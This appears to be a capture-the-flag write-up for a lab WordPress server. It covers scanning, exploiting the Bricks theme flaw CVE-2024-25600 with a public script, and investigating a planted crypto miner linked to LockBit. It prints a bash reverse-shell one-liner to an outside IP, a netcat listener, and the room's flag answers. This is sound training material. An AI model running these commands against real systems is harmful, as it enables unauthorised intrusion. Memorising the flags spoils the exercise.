Add the following entry to your hosts file.
Open the file `/etc/hosts` with root privileges using a text editor:
```BASH
sudo nano /etc/hosts
```
At the end of the file add this line:
```BASH
$ip bricks.thm
```

Start by performing an Nmap scan. Use the following command to scan the target and determine open ports and running services:
```BASH
nmap -sV $ip
```

The scan output shows that the website uses HTTPS on port 443 and that Apache is serving the application.

Next, run a Gobuster scan to further examine the website:
```BASH
gobuster dir -u "https://bricks.thm/" -w /usr/share/wordlists/dirb/big.txt -t 10 -x .txt,.php -k
```
![image](https://github.com/user-attachments/assets/9d6f6539-9d61-41c3-95c6-d938f6f9b713)  

The results indicate that the website is using WordPress.

### What is the content of the hidden .txt file in the web folder?
Use [WPscan](https://wpscan.com/) to enumerate the WordPress instance:
```BASH
wpscan --url https://bricks.thm --disable-tls-checks --enumerate u,vp,vt
```
- url - target URL
- disable-tls-checks - skip the expired cert problem (same as -k)
- u - enumerate usernames
- vp - vulnerable plugins
- vt - vulnerable themes

The WPScan output shows that the version of the Bricks WordPress theme is vulnerable. The vulnerability is known as [CVE-2024-25600](https://nvd.nist.gov/vuln/detail/CVE-2024-25600). A remote code execution exploit script is available on GitHub. Download that script and check provided README.md, because you have to install additionall libraries from python [source](https://github.com/Chocapikk/CVE-2024-25600). 

<span style="line-height:0.5;">&nbsp;</span>

Run the exploit script using this command:
```BASH
python exploit.py -u https://bricks.thm
```

<span style="line-height:0.5;">&nbsp;</span>

The exploit should allow you to execute code on the target server and eventually give you a shell. When you receive the shell, you must stabilize it. Set up a Netcat listener on your machine with this command:
```BASH
nc -lvnp 4444
```
In the compromised shell, run:
```BASH
bash -c 'bash -i >& /dev/tcp/10.10.96.142/4444 0>&1'
```

<pre>THM{fl46_650c844110baced87e1606453b93f22a}</pre>

This action creates a reverse shell that connects back to your Netcat listener. To further stabilize the shell, execute this command within the Netcat session:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### What is the name of the suspicious process?
Inspect the running processes by using `systemctl | grep running` command.  

![image](https://github.com/user-attachments/assets/54b8fffe-6262-45b2-a332-4fe0814e385c)  

There is a suspicious process named ubuntu.service TRYHACK3M. To examine the process in detail, display the contents of the service file:
```BASH
cat /etc/systemd/system/ubuntu.service                                                     
```
![image](https://github.com/user-attachments/assets/f2d9ea26-3284-4bb8-afe8-65f977fef8fd) 

The file shows that the suspicious process is called nm-inet-dialog. Its associated service is named ubuntu.service.
<pre>nm-inet-dialog</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the service name affiliated with the suspicious process?
<pre>ubuntu.service</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the log file name of the miner instance?
Next, investigate the log file for the miner instance: `ExecStart=/lib/NetworkManager/nm-inet-dialog`. Change into the directory: `/lib/NetworkManager`:
```BASH
cd /lib/NetworkManager                                                  
```
![image](https://github.com/user-attachments/assets/ffeaf339-0750-41d9-812f-7ca0c49c1252)  

List the directory contents and note that there is a configuration file called `inet.conf`. View the file with:
```BASH
cat inet.conf                                               
```
![image](https://github.com/user-attachments/assets/2f313a83-75ba-4da2-8d98-554c60e3a5f3)
<pre>inet.conf</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the wallet address of the miner instance?
The file contains settings that include an encrypted or obfuscated wallet identifier. Retrieve the minerâ€™s wallet address by copying the value from the file and decrypt the value with [CyberChef](https://gchq.github.io/CyberChef/).

![image](https://github.com/user-attachments/assets/14c37060-f054-4fae-889c-d2350f2252c6)  

After decryption you receive two similar bitcoin wallet addresses:
`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
`bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`    

You check both addresses on a [blockchain explorer](https://www.blockchain.com/en/). The first address shows the expected transaction history. This confirms that the correct wallet address is the first one.

<pre>bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa</pre>

<span style="line-height:0.5;">&nbsp;</span>

### The wallet address used has been involved in transactions between wallets belonging to which threat group?
Finally, determine which threat group is associated with this wallet.  

![image](https://github.com/user-attachments/assets/502326e2-e66c-450d-abd6-847101d44441)

Search for the wallet address 32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM using a search engine. The search results include information from an official [OFAC page](https://ofac.treasury.gov/recent-actions/20240220).

![image](https://github.com/user-attachments/assets/62b412eb-5f19-4d7d-b566-533d3d21d06c)

The record links the wallet with transactions performed by affiliates of a Russian-based threat group. The investigation confirms that the threat group is known as:
<pre>LockBit</pre>
